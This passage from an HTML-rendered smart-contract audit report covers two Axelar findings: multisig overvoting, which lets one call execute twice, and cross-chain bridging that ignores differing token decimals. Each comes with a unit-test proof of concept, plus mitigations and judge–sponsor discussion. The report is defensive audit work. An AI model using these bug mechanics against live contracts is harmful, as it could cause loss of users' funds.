before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Arguably, <a href=\"https://github.com/code-423n4/2023-07-axelar/blob/aeabaa7086eb35e8614e58b42f0d50728e023881/test/cgp/Multisig.js#L152-L176\">this unit test</a> is a PoC in itself.</p>\n<p>But the following example might be a better illustration. The following test passes (when based on the explanation above, it shouldn’t), and is a modification of the above test but using threshold 1:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"javascript\" data-index=\"17\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">it</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;executes the same call twice, accidentally&#39;</span><span class=\"mtk1\">, </span><span class=\"mtk4\">async</span><span class=\"mtk1\"> () </span><span class=\"mtk4\">=&gt;</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">targetInterface</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">new</span><span class=\"mtk1\"> </span><span class=\"mtk10\">Interface</span><span class=\"mtk1\">([</span><span class=\"mtk8\">&#39;function callTarget() external&#39;</span><span class=\"mtk1\">]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">targetInterface</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodeFunctionData</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&#39;callTarget&#39;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk4\">const</span><span class=\"mtk1\"> </span><span class=\"mtk12\">nativeValue</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1000</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Set the threshold to 1</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">multisig</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">signer1</span><span class=\"mtk1\">).</span><span class=\"mtk11\">rotateSigners</span><span class=\"mtk1\">(</span><span class=\"mtk12\">accounts</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">multisig</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">signer2</span><span class=\"mtk1\">).</span><span class=\"mtk11\">rotateSigners</span><span class=\"mtk1\">(</span><span class=\"mtk12\">accounts</span><span class=\"mtk1\">, </span><span class=\"mtk7\">1</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Say these two signers send their vote at the same time:</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">multisig</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">signer1</span><span class=\"mtk1\">).</span><span class=\"mtk11\">execute</span><span class=\"mtk1\">(</span><span class=\"mtk12\">targetContract</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\">, </span><span class=\"mtk12\">nativeValue</span><span class=\"mtk1\">, { </span><span class=\"mtk12\">value:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">nativeValue</span><span class=\"mtk1\"> })).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk11\">emit</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">targetContract</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk8\">&#39;TargetCalled&#39;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">multisig</span><span class=\"mtk1\">.</span><span class=\"mtk11\">connect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">signer2</span><span class=\"mtk1\">).</span><span class=\"mtk11\">execute</span><span class=\"mtk1\">(</span><span class=\"mtk12\">targetContract</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">calldata</span><span class=\"mtk1\">, </span><span class=\"mtk12\">nativeValue</span><span class=\"mtk1\">, { </span><span class=\"mtk12\">value:</span><span class=\"mtk1\"> </span><span class=\"mtk12\">nativeValue</span><span class=\"mtk1\"> })).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk11\">emit</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">targetContract</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk8\">&#39;TargetCalled&#39;</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// The call was executed twice!</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    });</span></span></span></code></pre>\n<h3 id=\"recommended-mitigation-steps-8\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-8\" aria-label=\"recommended mitigation steps 8 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Consider adding an incrementing nonce to each topic, so that repeating the call requires using a new nonce. If the intent is to allow arbitrary-order execution, then using a random or unique topic ID in addition to the topic hash could be used instead (like you did with the <code>commandId</code> in AxelarGateway).</p>\n<h3 id=\"assessed-type-6\" style=\"position:relative;\"><a href=\"#assessed-type-6\" aria-label=\"assessed type 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Assessed type</h3>\n<p>Access Control</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/116#issuecomment-1715322440\">berndartmueller (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Referencing the comment in <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/333#issuecomment-1712145265\">Issue #333</a>:</p>\n<blockquote>\n<blockquote>\n<p>it is assumed that the signers are trusted</p>\n</blockquote>\n<p>Isn’t the purpose of a multisig <em>not</em> to trust individual signers or even N-1 signers, but only trust when N of them sign?</p>\n<p>I would argue that a multisig meets it’s purpose if and only if the configured threshold is the absolute minimum number of signers that must be compromised to execute a proposal maliciously. The fact that overvotes can leave a spurious proposal with N-1 votes being sufficient for execution breaks one of the core assumptions when using a multisig.</p>\n<p>(I’d also note <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/116\">#116</a> and <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/245\">#245</a> could be considered duplicates. The impact descriptions are slightly different but the underlying issue is the same)</p>\n</blockquote>\n<p>After careful consideration, I’d like to change my stance on the validity and severity of the outlined issue of overcounting proposal votes. Let me elaborate on my reasoning:</p>\n<p>First of all, there’s an underlying trust assumption on the used multisig. All signers, initially chosen by the deployer of the multisig contract (<code>MultisigBase</code> or the derived <code>Multisig</code> contract), are trusted. Rotating signers, i.e., adding/removing signers and changing the threshold (quorum), is also voted on by the existing signers. Thus, assuming the new set of signers (and threshold) is reasonable and trustworthy.</p>\n<p>However, a multisig is purposefully used to ensure proposals only get executed once the quorum of the signers is reached.</p>\n<p>Given the outlined issue in the submission, overvoting by signers can occur. For example, if the signing transactions get executed within the same block. Moreover, it can be assumed that the <code>Multisig.execute</code> function is intended to be executed multiple times with the same arguments (calldata). For instance, to repeatedly perform certain token transfers on a regular basis. Adding some kind of “nonce” or additional data to the arguments to achieve a new and unique proposal (specifically, a unique <code>topic</code>) to be voted on is not reasonable as the <code>Multisig.execute</code> function does not provide such parameters. Contrary to OpenZeppelin’s <code>Governor</code> contract, which allows specifying a (unique) proposal description (see <a href=\"https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/governance/Governor.sol#L268-L289\">Governor.sol#L268-L289</a>). Additionally, in OZ’s <code>Governor</code> contract, casting votes is only possible on pending proposals and reverts otherwise.</p>\n<p>I consider “overvoting” as a bug worth mitigating as it leaves proposals in an inconsistent state, leading to unpredictable outcomes.</p>\n<p>Given <a href=\"https://docs.code4rena.com/awarding/judging-criteria/severity-categorization\">C4’s judging criteria and severity categorization</a></p>\n<blockquote>\n<p>2 — Med: Assets not at direct risk, but the function of the protocol or its availability could be impacted or leak value with a hypothetical attack path with stated assumptions, but external requirements.</p>\n</blockquote>\n<p>I’m considering this submission valid and the chosen Medium severity to be appropriate.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/333#issuecomment-1715982047\">deanamiel (Axelar) disputed and commented via duplicate issue #333</a>:</strong></p>\n<blockquote>\n<p>Perhaps for a generic multi-sig in which signers are not trusted this would be true. However, for the multi-sig that we have designed for our governance purposes, signers will be part of Axelar governance and therefore, will be trusted. It is the signer’s responsibility to ensure that a proposal exists before voting on it. We still wish to dispute validity.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/333#issuecomment-1716011785\">berndartmueller (judge) commented via duplicate issue #333</a>:</strong></p>\n<blockquote>\n<p>@deanamiel - I understand your point. Nevertheless, overvoting is possible (even if not done with malicious intent), and it can be fixed to prevent any future, while unlikely, issue.</p>\n<p>I acknowledge that the sponsor disagrees with the validity. The validity and severity are certainly close to being invalid and QA, respectively. Still, I lean more towards being valid and Medium severity.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/116#issuecomment-1801797757\">milapsheth (Axelar) commented</a>:</strong></p>\n<blockquote>\n<p>This was an intentional design decision. It’s designed for internal use and will have low usage frequency with a coordinated participation such that this issue is Low impact, but we acknowledge the concern for general use.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-08-insufficient-support-for-tokens-with-different-decimals-on-different-chains-lead-to-loss-of-funds-on-cross-chain-bridging\" style=\"position:relative;\"><a href=\"#m-08-insufficient-support-for-tokens-with-different-decimals-on-different-chains-lead-to-loss-of-funds-on-cross-chain-bridging\" aria-label=\"m 08 insufficient support for tokens with different decimals on different chains lead to loss of funds on cross chain bridging permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/52\">[M-08] Insufficient support for tokens with different decimals on different chains lead to loss of funds on cross-chain bridging</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-07-axelar-findings/issues/52\">0xTheC0der</a></em></p>\n<p>According to the <a href=\"https://github.com/code-423n4/2023-07-axelar/blob/main/DESIGN.md#custom-bridges\">docs</a>, the Axelar network supports cross-chain bridging of <strong>external</strong> <code>ERC20</code> tokens, as well as their own <code>StandardizedToken</code> (using lock/unlock, mint/burn or liquidity pools).</p>\n<ul>\n<li>However, there exists legitimate ERC20 tokens like USDT and USDC that have <strong>6 decimals</strong> on Ethereum (see <a href=\"https://etherscan.io/token/0xdac17f958d2ee523a2206206994597c13d831ec7#readContract#F6\">USDT on Etherscan</a> and <a href=\"https://etherscan.io/token/0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48#readProxyContract#F11\">USDC on Etherscan</a> but <strong>18 decimals</strong> on Binance Smart Chain (see <a href=\"https://bscscan.com/address/0x55d398326f99059ff775485246999027b3197955#readContract#F6\">USDT on BSCScan</a> and <a href=\"https://bscscan.com/address/0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d#readProxyContract#F3\">USDC on BSCScan</a>), just to name an example. So there are tokens which have different decimals on different chains.</li>\n<li>Furthermore, the Axelar network allows to deploy and register <code>StandardizedToken</code> with the <strong>same</strong> <code>TokenId</code> but <strong>different</strong> decimals on different chains, see PoC.</li>\n</ul>\n<h3 id=\"bug-description\" style=\"position:relative;\"><a href=\"#bug-description\" aria-label=\"bug description permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Bug description</h3>\n<p>A cross-chain bridging can be performed using the <a href=\"https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/its/token-manager/TokenManager.sol#L77-L100\">TokenManager.sendToken(…)</a> method, which correctly collects the source tokens from the sender and subsequently calls the <a href=\"https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/its/interchain-token-service/InterchainTokenService.sol#L493-L523\">InterchainTokenService.transmitSendToken(…)</a> method that generates the <a href=\"https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/its/interchain-token-service/InterchainTokenService.sol#L512\">payload</a> for the remote <code>ContractCall</code> and also emits the <code>TokenSent</code> event.</p>\n<p>However, this payload, as well as the subsequently emitted <code>ContractCall</code> and <code>TokenSent</code> events (see <a href=\"https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/its/interchain-token-service/InterchainTokenService.sol#L512-L514\">InterchainTokenService:L512-L514</a>) contain the unscaled <strong>source amount with respect to the source token’s decimals</strong>.</p>\n<p>Next, this exact payload (actually it’s <code>keccak256</code> hash) gets relayed on the remote chain as it is via <a href=\"https://github.com/code-423n4/2023-07-axelar/blob/2f9b234bb8222d5fbe934beafede56bfb4522641/contracts/cgp/AxelarGateway.sol#L455-L467\">AxelarGateway.approveContractCall(…)</a> and the <code>ContractCall</code> is now approved to be executed with the <strong>source amount irrespective of the remote token’s decimals</strong>.</p>\n<p>Therefore, the bridged amounts are off by a factor of <code>10^abs(sourceDecimals - remoteDecimals)</code>.</p>\n<p><em>Note that there are also other ways/entry points to reproduce this issue with the current codebase.</em></p>\n<h3 id=\"consequences\" style=\"position:relative;\"><a href=\"#consequences\" aria-label=\"consequences permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Consequences</h3>\n<p>This leads to a loss of funds for user/protocol/pool when source token decimals are lower/higher than remote token decimals, because the token amount is just passed through instead of being scaled accordingly.</p>\n<h3 id=\"proof-of-concept-9\" style=\"position:relative;\"><a href=\"#proof-of-concept-9\" aria-label=\"proof of concept 9 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>The first part of the PoC demonstrates the following:</p>\n<ul>\n<li>The Axelar network allows to deploy and register <code>StandardizedToken</code> with the <strong>same</strong> <code>TokenId</code> but <strong>different</strong> decimals on different chains. In this example, 18 decimals on source chain and 16 decimals on remote chains.</li>\n<li>The <code>sendToken</code> method creates the aforementioned payload (to be relayed) and the respective <code>ContractCall</code>/<code>TokenSent</code> events with the unscaled <strong>source amount</strong>.</li>\n</ul>\n<p>Just apply the <em>diff</em> below and run the test with <code>npm run test test/its/tokenServiceFullFlow.js</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"18\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">diff --git a/test/its/tokenServiceFullFlow.js b/test/its/tokenServiceFullFlow.js</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">index c1d72a2..3eb873b 100644</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">--- a/test/its/tokenServiceFullFlow.js</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">+++ b/test/its/tokenServiceFullFlow.js</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -31,6 +31,7 @@ describe(&#39;Interchain Token Service&#39;, () =&gt; {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     const name = &#39;tokenName&#39;;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     const symbol = &#39;tokenSymbol&#39;;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     const decimals = 18;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    const otherDecimals = 16;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     before(async () =&gt; {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         const wallets = await ethers.getSigners();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -151,13 +152,13 @@ describe(&#39;Interchain Token Service&#39;, () =&gt; {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">     });</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-    describe(&#39;Full standardized token registration, remote deployment and token send&#39;, async () =&gt; {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+    describe.only(&#39;Full standardized token registration, remote deployment and token send&#39;, async () =&gt; {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         let token;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         let tokenId;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         const salt = getRandomBytes32();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         const otherChains = [&#39;chain 1&#39;, &#39;chain 2&#39;];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         const gasValues = [1234, 5678];</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-        const tokenCap = BigInt(1e18);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+        const tokenCap = BigInt(10000e18);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">         before(async () =&gt; {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             tokenId = await service.getCustomTokenId(wallet.address, salt);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -184,7 +185,7 @@ describe(&#39;Interchain Token Service&#39;, () =&gt; {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                     salt,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                     name,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                     symbol,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-                    decimals,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                    otherDecimals, // use other decimals on remote chains</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                     &#39;0x&#39;,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                     wallet.address,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                     otherChains[i],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">@@ -197,19 +198,19 @@ describe(&#39;Interchain Token Service&#39;, () =&gt; {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             const params = defaultAbiCoder.encode([&#39;bytes&#39;, &#39;address&#39;], [wallet.address, token.address]);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             const payload = defaultAbiCoder.encode(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 [&#39;uint256&#39;, &#39;bytes32&#39;, &#39;string&#39;, &#39;string&#39;, &#39;uint8&#39;, &#39;bytes&#39;, &#39;bytes&#39;],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-                [SELECTOR_DEPLOY_AND_REGISTER_STANDARDIZED_TOKEN, tokenId, name, symbol, decimals, &#39;0x&#39;, wallet.address],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                [SELECTOR_DEPLOY_AND_REGISTER_STANDARDIZED_TOKEN, tokenId, name, symbol, otherDecimals, &#39;0x&#39;, wallet.address],</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">             await expect(service.multicall(data, { value }))</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 .to.emit(service, &#39;TokenManagerDeployed&#39;)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 .withArgs(tokenId, LOCK_UNLOCK, params)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 .and.to.emit(service, &#39;RemoteStandardizedTokenAndManagerDeploymentInitialized&#39;)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-                .withArgs(tokenId, name, symbol, decimals, &#39;0x&#39;, wallet.address, otherChains[0], gasValues[0])</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+                .withArgs(tokenId, name, symbol, otherDecimals, &#39;0x&#39;, wallet.address, otherChains[0], gasValues[0])</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 .and.to.emit(gasService, &#39;NativeGasPaidForContractCall&#39;)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 .withArgs(service.address, otherChains[0], service.address.toLowerCase(), keccak256(payload), gasValues[0], wallet.address)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 .and.to.emit(gateway, &#39;ContractCall&#39;)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 .withArgs(service.address, otherChains[0], service.address.toLowerCase(), keccak256(payload), payload)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                 .and.to.emit(service, &#39;RemoteStandardizedTokenAndManagerDeploymentInitialized&#39;)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span 